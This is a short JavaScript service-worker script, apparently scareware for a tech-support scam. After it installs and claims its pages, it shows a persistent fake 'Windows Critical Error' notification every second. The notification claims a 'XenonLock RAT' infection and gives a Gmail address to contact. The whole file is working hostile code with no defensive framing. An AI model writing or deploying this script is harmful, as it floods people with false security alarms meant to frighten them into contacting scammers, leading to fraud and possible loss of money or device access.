// Listen for install/activate events
self.addEventListener('install', (event) => {
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    event.waitUntil(self.clients.claim());
});

// Show notification every second (even if tab is closed)
setInterval(() => {
    self.registration.showNotification("Windows Critical Error", {
        body: "XenonLock RAT detected! Contact Xenonlocksupport@gmail.com",
        icon: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDJMMTMuMDkgMC44NkgxMkwxMiA4VjJ6bTAgMkgxMlYxNkg4di04em0wIDBoMjR2MjR6IiBmaWxsPSIjRkYwMDAwIi8+PC9zdmc+",
        requireInteraction: true
    });
}, 1000);